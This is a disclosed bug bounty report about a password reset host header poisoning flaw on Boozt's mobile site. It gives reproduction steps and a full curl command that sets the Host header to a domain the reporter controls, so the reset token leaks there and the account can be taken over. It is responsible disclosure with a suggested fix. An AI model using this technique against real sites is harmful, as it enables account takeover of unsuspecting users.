@@ -1,0 +1,52 @@
+ReportLink:https://hackerone.com/reports/167631
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/yassineaboukir
+ReportedTo:Boozt Fashion AB(boozt)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:17.09.2016 19:19:13
+
+Summary:
+
+Hi,
+
+**Issue Summary :**
+While conducting my regular testing I discovered that the mobile version of boozt.com application relies on the host header when constructing password reset links emailed to the user. Thus, an attacker can inject a arbitrary host header which leads to password reset leakage.
+
+**Impact :** The attacker will receive the leaked user password reset link and, as a consequence, take over user's account.
+
+**Proof Of Concept :**
+1. Browse to https://m.boozt.com/eu/en/customer/forgot_password
+2. Enter the victim's address mail (Easily enumerated abusing #165894).
+3. Click to reset the password.
+4. Intercept the HTTP request and tamper the host header to a domain name controlled by the atatcker as you can see below :
+
+{F119118}
+
+Otherwise, you can simply use the following CURL command to reproduce the request after replacing `<TOKEN>` and `<SESSION>` with a valid values:
+
+```
+curl -i -s -k  -X 'POST' \
+    -H 'Host: yassineaboukir.com' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:48.0) Gecko/20100101 Firefox/48.0' -H 'DNT: 1' -H 'Referer: https://m.boozt.com/eu/en/customer/forgot_password' -H 'cookie: <SESSION>;' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' \
+    --data-binary $'forgot_password%5Bemail%5D=yaaboukir@gmail.com&forgot_password%5B_token%5D=<TOKEN>' \
+    'https://m.boozt.com/eu/en/customer/forgot_password'
+```
+
+Now, the victim will receive a password reset e-mail with a poisoned link as you can see below :
+
+{F119124}
+
+Once the user clicks on it, he/she will be taken to :
+
+>https://yassineaboukir.com/eu/en/customer/reset_password/c2eca9c2b4160c94c884faa529e7ae4c
+
+The token is now leaked and the attacker now can simply go to the server logs and browse all the incoming HTTP requests to retrieve the password reset link. Consequently, the token is still valid and will be able to reset password of the victim's boozt account : GAME OVER!
+
+**Mitigation :** The web application should use the SERVER_NAME instead of the Host header as is the case in the main app boozt.com.
+
+**References :**
+- http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
+ 
+Kind regards.
+Yassine ABOUKIR
